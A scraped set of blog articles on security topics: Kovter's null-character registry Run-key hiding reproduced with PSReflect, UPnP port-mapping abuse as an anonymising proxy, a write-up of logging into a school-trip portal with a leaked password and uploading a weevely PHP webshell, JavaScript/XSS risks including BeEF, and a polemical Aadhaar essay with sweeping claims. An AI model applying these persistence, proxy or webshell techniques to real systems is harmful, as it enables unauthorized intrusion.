Kovter and its predecessor Poweliks use mshta to execute code stored in registry keys and values. To persist between reboots, Kovter uses a Run key value, but with a small twist: the key value name starts with a null character (\0), followed by random chars. The null character causes an error when attempting to read the value with Regedit and other techniques that expect a null-terminated string. Using a null-character in a value name to hide from Regedit has been known since at least 2005, and Mark Russinovich previously released a tool called RegHide as part of the Sysinternals Suite as a proof of concept.
The old Sysinternals page described why this null character trick worked:
“In the Win32 API strings are interpreted as NULL-terminated ANSI (8-bit) or wide character (16-bit) strings. In the Native API names are counted Unicode (16-bit) strings. While this distinction is usually not important, it leaves open an interesting situation: there is a class of names that can be referenced using the Native API, but that cannot be described using the Win32 API. […] When a key (or any other object with a name such as a named Event, Semaphore or Mutex) is created with such a name any applications using the Win32 API will be unable to open the name, even though they might seem to see it.”
A question from StackOverflow was also extremely helpful explaining the differences between calling the Win32 API and calling the Native API.
With PSReflect, we can make calls to the Native API through ntdll.dll from a PowerShell script, so we can implement our own version of RegHide and test our detection capability for Kovter-style key value names.
To follow along with the completed script, check out the PSReflect-RegHide gist or scroll to the bottom.
As a proof of concept, let’s create a Run key like Kovter: we’ll create a value under HKCU:\Software\Microsoft\Windows\CurrentVersion\Run, with a value name of “\0abcd”, and a value of “mshta javascript:alert(1)”, which should pop up an alert box on user logon. According to the MSDN article about Registry Key Object Routines, we’ll need at least three calls to write our hidden key value: first, NtOpenKey to open a handle to the key, second, NtSetValueKey to write the key value, and finally NtClose to close the key handle. PSReflect provides helpful functions to easily translate the documented C++ code into PowerShell. We’ll define the enums and structs necessary to make these function calls first.
Using MSDN, we can see that NtOpenKey requires the ACCESS_MASK enum and the OBJECT_ATTRIBUTES struct (which itself requires an ATTRIBUTES enum), and NtSetValueKey requires the UNICODE_STRING struct.
Let’s look at how to convert UNICODE_STRING into a PSReflect struct. We can “translate” the C++ data types into PowerShell types, so a USHORT, an unsigned short (16-bit int), becomes a UInt16, and a pointer to a WSTR becomes an IntPtr. For the ACCESS_MASK enum, the DWORD becomes a UInt32.
Next, we’ll define the functions that we want to import from ntdll to write to the Registry. Let’s look at NtOpenKey, NtSetValueKey, and NtClose. We specify the DLL name, ntdll, and the entrypoint for the exported function we want, such as NtOpenKey. Again, we can “translate” the types from the C++ code documented on MSDN into the equivalent PowerShell. HANDLE becomes IntPtr and ULONG becomes UInt32, while for pointer types such as PHANDLE and PUNICODE_STRING, we can use MakeByRefType() to properly pass by reference. Notice that we can use the structs we defined previously (such as UNICODE_STRING).
After calling Add-Win32Type, we now have access to these Native API functions in PowerShell as PowerShell Methods:
Let’s set up the necessary arguments to open a key. While making a KeyHandle (an empty IntPtr) and an ACCESS_MASK (an Int32) is straightforward, creating an OBJECT_ATTRIBUTES struct takes a bit of set up that is normally handled by a macro. Let’s take care of the easy stuff first:
Our ObjectName specifies the registry key we want to open, i.e. HKCU:\Software\Microsoft\Windows\CurrentVersion\Run. The object name for HKCU is in the format \Registry\User\<User-SID>\, so we’ll have to insert the correct User SID and create a UNICODE_STRING. The ObjectName field takes a pointer to a UNICODE_STRING, so we’ll have to create a pointer to the UNICODE_STRING as well.
Now we have all the arguments needed, so we can make a call to $ntdll:NtOpenKey.
Once we have a key handle opened, we can pass that $KeyHandle to other functions such as NtSetValueKey or NtClose. Closing our handle is a simple call:
After we open the key handle to the Run key, our next step is to add the hidden value key, so that our “payload” runs at logon. To call NtSetValueKey, we’ll need our key handle, plus the Value Name, its Type, and the Value Data.
While we previously used RtlInitUnicodeString to initialize our UNICODE_STRINGs, here we will manually create the structure to put a null character in the string. RtlInitUnicodeString, like other Win32 API calls, searches for the null-terminator (\0) to determine the end (and the length) of a string, but here we manually specify the length of the string and its buffer, so we can put in whatever characters we’d like in our value name.
After calling NtSetValueKey with our arguments, our hidden Run key is created. RegEdit will throw an error when viewing the key, while reg query and PowerShell’s Get-ItemProperty won’t return a value hidden in this way. However, using the Autoruns tool from Sysinternals, we can see (and delete) the value we just created:
So why bother implementing a trick to obfuscate a registry value that isn’t truly hidden? In my opinion it’s important to examine what techniques various malware and APT tools use, as well as their implementations, so we can understand exactly how to detect and remediate these TTPs. While writing a registry key value name with a null character is a relatively simple example, it’s also a good introduction to how PSReflect makes Native and Win32 API access easy in PowerShell.
I wrote the rest of the NtXxxKey routines (NtCreateKey, NtQueryKey, NtQueryValueKey, NtEnumerateKey, NtEnumerateValueKey, NtDeleteKey, and NtDeleteValueKey) and added them to the PSReflect-Functions repo, which maintains a growing number of useful Win32 functions as a PowerShell module.
Written by
","['About', 'All Posts', 'specterops.io', 'Cybersecurity', 'Powershell']"
Hiding Through a Maze of IoT Devices - Just another infosec blog type of thing,https://blog.0day.rocks/hiding-through-a-maze-of-iot-devices-9db7f2067a80?source=tag_archive---------5-----------------------,"In March 2018, Symantec reported about the Inception Framework abusing vulnerable UPnP services to hide themselves. The Inception APT, a cyber espionage group from an unknown origin used this since 2014 to launch stealthy attacks. In this particular case, Symantec also reported that no custom malware needed to be injected on the routers… let’s take a deeper look.
UPnP stands for Universal Plug and Play and is basically just a set of networking protocols to allow devices to discover each other in the LAN and use some network features (such as data sharing or entertainment) without any configuration (hence “plug and play”). It’s a pretty old architecture that was designed in the late 90’s and finished in the early 2000’s. The most implemented revision of the protocol is probably the 1.1 that was published in 2008 and the most recent one (UPnP Device Architecture 2.0) in 2015.
According to the UPnP specifications there are 6 layers of protocols, and among them the three important for this research:
Here is a diagram to understand how these layers come together:
Everything is well documented in the UPnP specifications 1.1 and 2.0.
There is more than one way to abuse UPnP, and I’m not even talking about the numerous CVEs affecting UPnP implementations. Several vulnerabilities in the UPnP design have been reported in the last decade, most of them are due to misconfiguration of the service or poor implementations. My post will describe one of them: the Open Forward attack, but more on that later.
Normally UPnP is supposed to work on a local network, like so:
SSDP uses UDP on the 1900 port, it will send a M-SEARCH HTTPU packet (yes, it’s HTTP over UDP) to the 239.255.255.250 IPv4 address (Local Scope multicast from RFC2365) or ff0X::c in IPv6.
Now, if you do send a M-SEARCH packet over the Internet to some vulnerable UPnP-enabled device, it will actually reply back, even though the protocol is supposed to be local-only! That’s the first step towards our goal: using the router as a proxy.
This is the first vulnerability here, the discovery service shouldn’t listen on the WAN interface. Now what can get an attacker sending the M-SEARCH packet?
Example misconfigured device actually replying back:
The M-SEARCH server’s response contains a Location HTTP header pointing to the XML Device Description.
Here you can notice the named private IP address in the URL, but then again you can (in most cases) actually access the web server through the WAN on its public IP address. You’ll get served the SCPD (Service Control Protocol Document), this is an XML document which defines the set of Actions and State Variables that a Service implements. Yay UPnP standards…
This is basically where you’ll find what capabilities the device is offering. The XML will also show you the ControlURL variables for each service, this is the SOAP endpoint to talk to that particular service (in substance a GET/POST to that URL will trigger actions).
One of the most interesting service for our research is the WANIPConnection, this is the one being abused. The true evil shines through the skin of UPnP in the later stages.
According to the UPnP standard:
This service-type enables a UPnP control point to configure and control IP connections on the WAN interface of a UPnP compliant InternetGatewayDevice . Any type of WAN interface (e.g., DSL or cable) that can support an IP connection can use this service.[…] An instance of a WANIPConnection service is activated (refer to the state variable table) for each actual Internet connection instance on a WANConnectionDevice. WANIPConnection service provides IP-level connectivity with an ISP for networked clients on the LAN.
More simply put, this is the NAT traversal toolbox of the UPnP standard. In the documentation you’ll find a function called AddPortMapping() that is used to ask the router (IGD) to redirect TCP/IP traffic to a specific host/port in the LAN. Very useful for peer-to-peer or games that require to open a port behind a “NATing” device.
Now let’s abuse this UPnP function, shall we?
As you can guess, it’s possible to invoke UPnP SOAP functions from the WAN interface and without any kind of authentication. If you send an AddPortMapping request for malicious intent you can either:
The first option has been recently dubbed by Akamai as UPnProxy: EternalSilence, an other threat actor used this trick to access Windows’ SMB ports behind routers to exploit the infamous EternalBlue vulnerability.
In my research (inspired by the Symantec discovery) I was more intrigued about the second option. So how does it work?
The attack is actually really clean, you simply have to ask — just as if you were on the LAN — the router to gently add a port mapping with the right parameters. Instead of redirecting the traffic to a local client, you can specify any public IP address. In most implementations the UPnP daemon will just spawn an iptables process with your specified parameters… without any check!
This way you can use the router as a dumb proxy and masquerade your IP address. This is what have been doing this Inception group with 3 layers of routers.
According to Shodan there are 2.2 Millions (as of November 2018) UPnP-enabled devices responding to a M-SEARCH discovery request… this is huge but hang on.
Through active scanning, I found that 13% of exposed UPnP devices were vulnerable to the Open Forward attack I mentioned earlier. This is about 290k vulnerable devices across 80 countries.
290,000 vulnerable devices across 80 countries
The four most impacted operators:
This represents a large set of potential victims and possible proxies for cyber criminals. There are actually 44 times more vulnerable nodes than Tor relays. It also leaves a minimal footprint: no implant necessary to leverage this and logs are generally hard to get on those boxes (most of them being proprietary ISP boxes).
Another advantage for an attacker to “anonymize” themselves using this, is the fact that most of the IP addresses are residential IPs, i.e. not blacklisted or known as a proxy (such as VPNs or Tor relays). But there are several drawbacks: it’s very slow (due to a big SOAP overhead), and that it doesn’t encrypt the traffic.
Many different threat actors were using this UPnP “Open Forward” hack… and it’s still being abused as we speak.
Keep in mind that this is just one function of one UPnP service among many others. I’ll let my readers think about the potential other services that could be abused in such ways �
This article serves as a recap of the talk I gave at ZeroNights 2018. As usual, feel free to ping me @x0rz if you have any remarks or suggestion. If you liked this article you can also pour me some coffee☕. Peace!
Written by
","['SSDP', 'Cybersecurity', 'Vulnerability', 'Cybercrime', 'IoT', 'Anonymity']"
How an Instagram’s Story drives me to a Remote Code Execution.,https://medium.com/bugbountywriteup/how-an-instagrams-story-drives-me-to-a-remote-code-execution-9ff96458ec89?source=tag_archive---------7-----------------------,"All information shared are for educational purposes only. Use these at your own discretion and remember: you are responsible for any damages caused. Actually, think about how this hack was possibile, how it could have been happened and, if you’re a dev, make sure to build more secure systems than that.
The views expressed on this article are my own and do not necessarily reflect the view of other people.
These days are very hot in the infosec community, especially here in Italy. There are only a few days left before the next political elections and two of the biggest political parties have been hacked, at different levels and in different ways[1][2][3]. The discussion about *ethical hacking* reached its peak when a student was reported for revealing a huge vulnerability in Rousseau, a major web-platform of the “Movimento 5 Stelle”, currently the biggest italian political party.
I don’t want to bring more items to this discussion since enough things have already been said so I thought it was cool to bring my vision of *ethical hacking* with a critical vulnerability that I found by chance thanks to an interesting Instagram Story.
A simple but effective way to describe the idea behind the Instagram Stories is the following statement that I found on a marketing website[4] and translated in english for the readers:
After the appropriate corrections, this statement looks perfect for the story I‘m going to share with you:
As already said in the introduction, during a sleepless night a particular Instagram Story caught my attention:
At first glance it appears innocent: this person just posted a pic about his/her upcoming school trip. Nothing new, I guess almost everyone see those pictures on Instagram every single day.
But if you look closer it’s possibile seeing something more interesting:
Yes, that’s a password (redacted for obvious reasons) and a web-address to a login portal (also redacted for the same reasons). At that time, I don’t know if it worth or not but I tried to reach that address and the following page appears:
I guessed I have all information needed, so I typed down the password found and it worked.
The following picture shows the successfully login:
“Ok cool, but I don’t think there is too much I can do here. I don’t want to start poking with the web-application searching for bugs etc…”
I started looking around without forcing anything but acting like a normal user. This portal offers a summary of the upcoming trip of the person who posted the photo on Instagram.
It’s possibile to retrive useful information like lessons timetables, addresses of schools and hotels, name of involved teachers and cellphones numbers. I mean, there are some sensitive information but nothing very interesting here also because the student can only access to the information of his school trips, he can’t see information about other school trips. Well, not really.
I started looking at the URL in the browser while I was browsing in the website and I notice that all the pages I can browse are in the same sub-domain. A couple of examples (the original folder’s names have been changed):
So I browse to the root directory of the subdomain.domain.it and this page appeared in front of me:
Ok, the temptation here was very strong, but I had already decided to not try to exploit anything. Sorry, no injection attempts here.
What I did was a “manually knock-knock approach”: just a couple of common auth combinations also with the previous password found but nothing was working and it was sad. Sorry, no bruteforce here.
After a few knock-knock I decided to try to open the door without using any keys, and surprisingly it worked.
No username and no password was actually the credentials used. Welcome to 2018 guys.
After succesfully login, the web-application shows the following dashboard:
Now I have access to all the trips scheduled (upcoming and already ended). ¯\_(ツ)_/¯
From now on, I can arbitrary modify indiscriminately every single trips information, as the following image shows:
But the best feature I found was the following one:
Yes, arbitrary file upload. This function is used for attach .pdf files with trip’s information for the students.
But, what if I try to upload a “non-pdf” file? Let’s start with a text file:
It worked, so it seems that there is no check on the file’s extension. Let’s try with a tiny .php file as follow:
As a penetration tester find the ability to run arbitrary php code on a web-server is obviously considered pretty bad:
But there you go..BINGO! The web-server interpreted successfully my tiny php file and I’d got all I needed in order to try to execute arbitrary code on this machine.
In order to demonstrate a RCE I uploaded a php agent with weevely3: the agent is small, hardly detectable by AV software, and the communication between the client and the agent is obfuscated within HTTP requests.
This is the obfuscated PHP agent uploaded:
I renamed it as “new_settings.php” and successfully uploaded it to the server:
After that I connect to the agent as follow and voilà:
Remote Code Execution successfully obtained!
I guees i’m done with it, it’s time to inform the vendor about what I found. How will they react to this?
References:
[1] https://www.agi.it/politica/hacker_movimento_5_stelle-3461812/news/2018-02-08/
[2] http://formiche.net/2018/02/hacker-rousseau-polizia-postale/
[3] https://www.ilfattoquotidiano.it/2018/02/06/hackerato-il-sito-del-pd-di-firenze-anonplus-ci-sono-dati-di-matteo-renzi-dem-roba-vecchia/4140764/
[4] http://www.ninjamarketing.it/2018/02/19/le-instagram-stories-stanno-cambiando-cosa-dovrebbe-tenere-a-mente-ogni-brand/
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Security', 'Cybersecurity', 'Vulnerability', 'Hacking', 'Ethical Hacking']"
How a Quantum Computer Could Break 2048-Bit RSA Encryption in 8 Hours,https://medium.com/mit-technology-review/how-a-quantum-computer-could-break-2048-bit-rsa-encryption-in-8-hours-77113ec0b406?source=tag_archive---------5-----------------------,"Written by
","['Quantum Computing', 'Cybersecurity', 'Technology', 'Encryption', 'Data Security']"
How Companies Are Hacked via Malicious Javascript Code?,https://itnext.io/how-companies-are-hacked-via-malicious-javascript-code-12aa82560bdc?source=tag_archive---------2-----------------------,"JavaScript is dangerous. Maybe you’ve heard this sentence several times before. Actually, being dangerous or not dangerous is true under different circumstances. JavaScript can be dangerous if the proper precautions aren’t taken. It can be used to view or steal personal data even you don’t realize what’s going on. And since JavaScript is so ubiquitous across the web, we’re all vulnerable.
Click here to share this article on LinkedIn »
JavaScript is good for the most part, but it just happens to be so flexible and so powerful that keeping it under control can be difficult. It all end up with how JavaScript actually works.
Let’s take a quick look at the working mechanism of JavaScript.
What is Javascript? Javascript is called the language of the Web. Each new version of browsers pushes the speed bar for execution time higher in terms of JavaScript execution speeds. This is an important performance parameter these days as websites make extensive use of JavaScript. JavaScript led the Web 2.0 revolution with AJAX. Using JavaScript, websites can send HTTP requests behind the scenes and customize or update certain sections of the site, tailored to a particular user’s needs. This does away with complete page refreshes and makes the user interface a lot more powerful and user friendly.
The browser fetches a page which might have embedded any
JavaScript code, or refers to a separate JavaScript file in which case that the file is also fetched by the browser. Afterwards, depending upon what you want your JavaScript code to do and how you structured it, it will either execute as soon as the file loads or will wait for a triggering event (like a click, or load). Finally, when everything is OK, the code is executed line by line. JavaScript is an interpreted language, which means you don’t need to compile the code into another form to execute it. All of the changes you make, they instantly take effect.
Some people assumes that because JavaScript has “Java” in its name they are somehow related with Java. It seems that the name was intentionally selected to create confusion, and from confusion comes misunderstanding. JavaScript shouldn’t be interpreted as Java. JavaScript is a different language.
JavaScript codes live within a web page, it either provides additional features to the web page or create an application within the web page itself. Some video games have been developed using JavaScript, and they can be played right in the Internet browser window. Java programs can typically perform calculations and the main “thinking” process on the server side or within a Java applet which should be downloaded initially.
A JavaScript library is a library of prewritten JavaScript which allows for easier development of JavaScript-based applications, especially for AJAX and other web-centric technologies.
In JavaScript, the way we use it effectively is by using a library. A library is a JavaScript file that contains a bunch of functions, and those functions accomplish some useful task for your webpage.
Almost every web sites on the internet use JavaScript libraries. In a recent academic study shows JavaScript library usage across all the web. In this study, researchers crawl Alexa top 75k website and the websites which are located under “COM” top-level-domain separately. Results are given in the Figure below.
According to the results obtained, 87.7% of Alexa sites and 46.5 % of .com sites use at least one well-known JavaScript library, with jQuery being the most popular by a large majority.
Why ?
Now let’s think about the damage of a serious vulnerability in the JQuery or other widely used libraries.
In such a case the effect would be very much.
In the continuation of the article, we’ve explained what can be done with a vulnerability in any JavaScript library and how can we achieve established security infrastructures for JavaScript enabled websites.
JavaScript Lib. can be abused, and that abuse leads to scenarios
that make it possible to snoop around your Internet activity and violate your privacy. The cruel part is that your website can be hacked even if your website is secure enough, because of a vulnerability in a JavaScript library that you use in your website. We’ve benefited from this source to explain following three types of malicious usages of JavaScript.
Attackers can track text boxes where users could make status updates, write wall comments, etc. using a bit of embedded JavaScript code. In July 2012, a pair of researchers sampled data from 5 million Facebook users in USA and UK. The researchers made it clear that they only use recorded content which is “the presence or absence of text entered” rather than “keystrokes or content”. Still it was possible to track keystrokes and content. They just chose not to. It is certain that the attackers will not behave the same way.
The notion is a scary one. A small amount of embedded JavaScript is all that’s needed to record any kind of activity on a webpage — even if you don’t actually submit anything! Web scrolling, mouse movements, keystrokes: all of them can be tracked and recorded against your will or without your knowledge.
Things which can be tracked with JavaScript is not limited only with keystroke content, a bit of embedded JavaScript code can track your browser cookies. Through the magic of browser cookies, companies can store all kinds of user-specific information: browser type, preferences, location, etc. A lot of websites are already tracking your browser cookies to be able to offer a better user experience. For any purpose, you may think that they are constantly watching you when you surfing on the internet (in my opinion).
One of the most sneaky uses of JavaScript is cross-site scripting (XSS). Simply put, XSS is a vulnerability that allows hackers to embed malicious JavaScript code into an legitimate website, which is ultimately executed in the browser of a user who visits the website.
If this happens on a website that handles sensitive user information, such as financial data, the malicious code could potentially snoop and steal that information. Taken one step further, XSS can be used to reproduce viruses and malware, which is what happened when Twitter was infected with the StalkDaily worm.
And there’s another vulnerability which is called cross-site request forgery (CSRF). This kind of malicious JavaScript code can exploit a user’s browser, cookies, and security permissions in order to perform actions on a separate website.
BeEF is a project which uses browser vulnerabilities to gain control of the target computer system.
BeEF is a framework similar to Metasploit. BeEF uses a javascript, hook.js, when this JavaScript code is executed by a browser, it gives a ho
ok to BeEF. With a hooked browser, you can have a list of array of exploits to use, like in metasploit. Some of them are used for viewing cookies or viewing browser histories but in the end, they aim to have more sophisticated attacks to get a shell.
So, how the attack works is as follows, the client visits a malicious page, which contains BeEF’s hook.js script running on it, or it can be executed via an XSS attack. Attackers can use the same way to hack the target computers using vulnerabilities on a JavaScript Libraries. When malicious code is executed, you can see that a browser is hooked to you on your BeEF control panel and finally, exploits are launched.
Let’s consider a possible scenario, as mentioned in Table I above, JQuery is widely used worldwide (%86 in alexa, %62 in Com). Today, JQuery has 66 different versions. More than half of these versions have at least one vulnerability. If attackers can add malicious code (e.g. hook.js ) to a website using any vulnerability, they can gain full access to the target machines. Considering that JQuery is so widely used, this situation may affect millions of people in a bad way. (Detailed information about these statistical informations are explained below.)
You may think that disabling JavaScript is exact solution to prevent these undesired hacking events. But if you do this, you’d lose out on a lot of awesome web functionality, such as the “infinite scrolling” feature that exists on many blogs, social networks, and news sites. But more so, some browser exploits are still possible even if you disable JavaScript. Disabling JavaScript due to security concerns is like wearing a bubble suit every time you go outside because you’re afraid of getting hurt. It won’t actually protect you from much, but it will make your life miserable.
If so, we need to take some charming precautions for our JavaScript enabled websites to be secure enough.
But How? It is a little complicated and there is some limitations.
About this topic, there is an academic paper which is published recently. In this post we’ve benefited strongly from the paper. If you want to read more detailed information, read this referenced paper.
In the referenced study, over 133k websites were analyzed, and they show that 37% of them include at least one library with a known vulnerability. While JavaScript is the de-facto standard for developing client-side code on the Web, at the same time it is notorious for security vulnerabilities.
Figure 1 shows details of the 11 libraries with vulnerability information. For each library, we show the total number of versions in our catalogue as well as the fraction of versions. The worst offender is Angular 1.2.0, which contains 5 vulnerabilities. Overall, we see that 28.3%, 6.7%, and 6.1% of these library versions contain one, two, or three known vulnerabilities, respectively. More than half version of JQuery has one vulnerability. (Source of figure: study )
Third-party modules such as advertising, trackers, social media or other widgets that are often embedded in web pages typically implemented in JavaScript. Furthermore, these scripts can also load libraries, possibly without the knowledge of the website administrator. If not isolated in a frame, these libraries gain full privileges in the including site’s context. Thus, even if a web developer keeps own library dependencies updated, outdated versions may still be arise from badly maintained third-party content. Also, some JavaScript libraries and many web frameworks contain their own copies of libraries that they depend on. Hence, web developers may unknowingly rely on software maintainers to update JavaScript libraries. (Source: study )
In the referenced study, results show that 36.7% of jQuery inclusions are known vulnerable in ALEXA, when at most one inclusion of a specific library version is counted per site. Angular has 40.1% vulnerable inclusions, Handlebars has 86.6 %, and YUI 3 has 87.3 % (it is not maintained any more). (Source: study )
First, there is no centralised repository of metadata pertaining to JavaScript libraries and their versions, release dates, and known vulnerabilities. This fact makes the management of vulnerability more difficult. There are no reliable vulnerability databases, no security mailing lists maintained by library vendors. They have almost no details on security issues contained in release notes. So, it is difficult to determine which versions of a library are affected by a specific reported vulnerability.
Second, web developers often modify JavaScript libraries by reformatting, restructuring or appending code, which makes it difficult to detect library usage in the wild. To include a library into their website, developers typically use the <script src=”url”></script> HTML tag and point to an externally-hosted version of the library or a copy on their own server. Library vendors often provide a minimised version that is whitespace removed, has comments and local variables shortened to reduce the size of the file. Developers can also concatenate multiple libraries into a single file, create custom builds of libraries, or use advanced minimising features such as dead code removal. This is another complicated reason. When a developer modifies a library and use it, detection of which library and its version were used in the website is very hard for an automated tool.
Third-party modules such as advertising, trackers, social media or other widgets that are often embedded in web pages typically implemented in JavaScript. Furthermore, these scripts can also load libraries, possibly without the knowledge of the site maintainer. If not isolated in a frame, these libraries gain full privileges in the including site’s context.
Attackers can use these capabilities to steal data from a user’s browsing session, initiate transactions on the user’s behalf, or place fake content on a website. Therefore, JavaScript libraries should not introduce any attack vectors into the websites where they are used.
Some libraries such as Google Maps, advertising and tracking libraries like Google Analytics, and social widgets typically do not publish version information. Fortunately, the vast majority of such libraries are hosted by their creators at a single, non-versioned JavaScript Library (e.g., GoogleAnalytics.js ). It means that all clients automatically include the latest version of the library. This is very good thing for the security.
Written by
","['About ITNEXT', 'Meetups', 'SUMMIT', 'Featured ', 'Vacancies @ LINKIT', 'JavaScript', 'Cybersecurity', 'Vulnerability', 'Angularjs', 'Alexa']"
How does linking your Aadhaar to your bank account destroy the banking system?,https://medium.com/@anupamsaraph/how-does-linking-your-aadhaar-to-your-bank-account-destroy-the-banking-system-5bb0379f2886?source=tag_archive---------4-----------------------,"Linking Aadhaar[1] to bank accounts is a recipe for creating benami[2] bank accounts and scaling benami bank transactions. It threatens to destroy your bank accounts and destroy the country’s banking system. It’s devastating that the integrity of banking processes is being destroyed by dividing, outsourcing and privatising processes integral to core banking so that they become the responsibility of no one.
Destroying the banking system
India’s Department of Revenue (DoR) has done it again.
On June 1, 2017 vide Notification №2/F .No. P.12011/11/2016-ES Cell-DOR it mandates the linking of every bank account with an Aadhaar number before December 31, 2017. While lawyers point out several illegalities, including the scope, of the notification of this subordinate legislation under the Prevention of Money Laundering Act (PMLA), the failure of the DoR to consistently protect national interest is unbelievable.
This latest notification ensures that the Trojan horse that they instilled into the banking system on January 27, 2011, will destroy the Indian economy along with the Indian banking system. As feared by the Reserve Bank of India before January 2011, Aadhaar is yet the best state sponsored enabling mechanism for money launderers to enable benami bank accounts. Aadhaar can even help the money launderer to take over your bank accounts. Aadhaar is also the enabler to scale benami transactions
A few days back a co-panelist on a TV channel defended the DoR arguing that linking Aadhaar to Bank Accounts will weed out money laundering by verifying bank accounts. What my co-panelist did not say is money laundering is facilitated by creating benami accounts. It is also facilitated by benami transactions. Nor did my co-panelist explain how benami accounts happen or how benami transactions are scaled by money-launderers.
This latest notification ensures that the Trojan horse that they instilled into the banking system on January 27, 2011, will enable benami bank accounts and scale benami transactions to destroy the Indian economy along with the Indian banking system. As feared by the Reserve Bank of India (RBI) before January 2011, Aadhaar is yet the best state sponsored enabling mechanism for money launderers to enable benami bank accounts. Aadhaar can even help the money launderer to take over your bank accounts. Aadhaar is also the enabling mechanism to scale benami transactions.
Here are just 5 ways in which linking the Aadhaar to PAN[3] or a bank account will hurt you, destroy India and, for those who care, an explanation of how Aadhaar creates benami bank accounts and scales benami transactions.
One, the innocent will lose money, reputation and access to justice, dignity and livelihood as their Aadhaar numbers can act as mules for money laundering, their subsidy and other Aadhaar enabled payments can be easily compromised, their access to their own bank accounts be denied, or they can be framed for economic offences. Helpless citizens and businesses may also find themselves at the receiving end of covert human rights violations as even their access to money and existence is disabled by deactivation or blocking of Aadhaar leaving no recourse to survival.
Two, linking Aadhaar to bank accounts or PAN converts India into the new tax haven for money launderers as it becomes easy to remotely create benami accounts and operate benami transactions while claiming complete legitimacy. This will destroy India’s economy and governance.
Three, financing crime and terrorism will grow uncontrollably as it becomes increasingly difficult to discover, report or close down such operations. This will make it impossible to ensure national security as the rule of law is destroyed.
Four, corruption will increase as it becomes easier when proceeds will not be traceable to the corrupt. It will be increasingly difficult to restore swarajya and impossible to ensure suraiya.
Five, banks will not be able to contain non-performing-assets, fraud and financial misappropriation as the real users of banking services will be untraceable. The economy will be completely out of control as the black and white economies become indistinguishable.
We are in a policy vacuum as the NITI Aayog and the bureaucracy have failed to recognise the Trojan horse and protect national interest. Unless the RBI de-licenses the payments systems based on Aadhaar (AEPS) immediately and the government stays linking Aadhaar to PAN and bank accounts, our leadership will have failed to protect India from this fast colonisation of India by the private interests driving Aadhaar.
Enabling Benami Bank Accounts
Benami accounts get created when banks fail to identify the real customers who own the accounts. The Panama Papers exposed data of thousands of benami accounts created through a Panamanian law firm, Mossack Fonseca. The Panama Papers exposed one modus operandi of hiding the real owners of the assets in tax havens.
Prudent bankers recognise the importance of knowing who they bank with. It is no wonder that the RBI had warned, right from before the Trojan horse was instilled in to the RBI in 2011, that the Aadhaar enrolment process does not have due diligence. It pointed out that for Aadhaar enrolment verification is not compulsory, as confirmed by the UIDAI in the Demographic Data Standards and Verification Procedure, and does not require document based verification.
After the introduction of the Aadhaar to open bank accounts, the accounts and deposits have doubled in 5 years. No one knows who really controls these accounts
The RBI also highlighted that such use of Aadhaar as third party identification is against Prevention of Money Laundering Act, the Financial Action Task Force (FATF) and the paper issued on Customer Due Diligence (CDD) for banks by the Basel Committee on Banking Supervision and circulated to scheduled commercial banks by the RBI on November 29, 2004.
The RBI also observed that a fixed time document like the Aadhaar cannot be a Proof of Address. It further cautioned using Business Correspondents (BC), to open bank accounts or undertake banking transactions, as the vulnerability of the system has not been tested and co-mingling funds of different banks in the hands of BC’s was a major operational risk to the banks. While resisting the use of Aadhaar, the RBI also highlighted the Government’s concern about the perceived misuse of such accounts for terrorist financing.
Under pressure from the UIDAI and the Department of Revenue, Ministry of Finance, the RBI, through its circular dated January 27, 2011, allowed bank accounts to be opened exclusively on the basis of Aadhaar number. However the RBI required such accounts to be put to restrictions and be subjected to conditions and limitations prescribed for small accounts.
Not happy with the restrictions, the UIDAI pressed the RBI to lift the restrictions placed on accounts opened with Aadhaar numbers under the PMLA. On September 28, 2011, again through the Department of Revenue, the UIDAI succeeded in getting the RBI to backtrack and suspend the restrictions of the PMLA on bank accounts opened solely through Aadhaar. The UIDAI also succeeded in causing the RBI further to accept eKYC or remotely using information associated with an Aadhaar number as KYC. According to the UIDAI eKYC brings scale to the ease of onboarding customers.
Even your Aadhaar can be used, without your knowledge, by a perpetrator to open multiple accounts in order to use it to collect bribes, park black money, or siphon your subsidies. In the eyes of law enforcement, if these accounts are discovered, you will be the criminal
To put the problem in perspective, Aadhaar enrolment was completely outsourced to private parties by the UIDAI with the sole aim of building the worlds largest biometric database. Mr. Nilekani’s UIDAI repeatedly emphasised that they merely provided a framework to issue a number and store the (unverified and unaudited) data.
No one from the UIDAI or even the government even sign the Aadhaar card that is mailed back to the enrolee. The very same organisations that were declared by the UIDAI as holding databases full of ghosts and duplicates were asked to serve as “Registrars” to the enrolment process. They were even given flexibility in the collection, retention and use of the data (including biometric) that they collected.
No one in the Aadhaar enrolment process was required to identify anyone. At best they had to merely verify documents that were submitted for enrolment. Needless to say anyone in possession of your documents could enrol with minor changes in any demographic information or with different biometrics. Field stories of enrolments are full with descriptions of biometric jugaad including using combination of persons, use of biometric masks, biometric modifications, and other ingenious methods to maximise registrations.
According to the IT Minister Ravi Shankar Prasad, 34,000 operators who tried to make fake Aadhaar Cards have been blacklisted. Even if each operator worked for a year before being blacklisted, at about 100 cards a day amounts to over a billion cards. That is more than 95 percent of the database. The Aadhaar enrolment has been unlike that of any other identity document, easily scaling the creation of duplicate and ghost identities.
While there is widespread belief that biometric authentication at time of opening a bank account prevents benami, it ignores the field realities of mobile phone SIM cards being issued on Aadhaar photocopies and used to open bank accounts, of having remotely “downloadable” accounts, and also plain simple use of photocopies of Aadhaar or parallel Aadhaar databases to open bank accounts. With Aadhaar, banks do not have any trace of the real customer. The real customer is simply masked by a benami owner using an Aadhaar number.
Even your Aadhaar can be used, without your knowledge, by a perpetrator to open multiple accounts in order to use it to collect bribes, park black money, or siphon your subsidies. In the eyes of law enforcement, if these accounts are discovered, you will be the criminal.
To compound the problem, UIDAI has no liability for benami bank accounts opened with Aadhaar. After the introduction of the Aadhaar to open bank accounts, the accounts and deposits have doubled in 5 years. No one knows who really controls these accounts.
Enabling Benami transactions
Even when it had no mandate to develop banking platforms, in 2009, the UIDAI signed an MoU with the National Payments Corporation of India (NPCI), a non government company, to develop an Aadhaar Enabled Payment System (AEPS). In this MoU the UIDAI has no responsibility for your banking transactions and the NPCI has no obligation to the RBI. The payment system uses the Aadhaar linked to a bank account as a financial address to do electronic money transfers from one Aadhaar number to another.
Unless an Aadhaar is linked to the account, the AEPS cannot access the bank account. Linking a PAN to the Aadhaar will have the same effect as linking the Aadhaar to a bank account as the PAN is already linked to the bank account. Such accounts become Aadhaar enabled. Aadhaar enabled bank accounts are ready to be used by the AEPS for Aadhaar to Aadhaar money transfers.
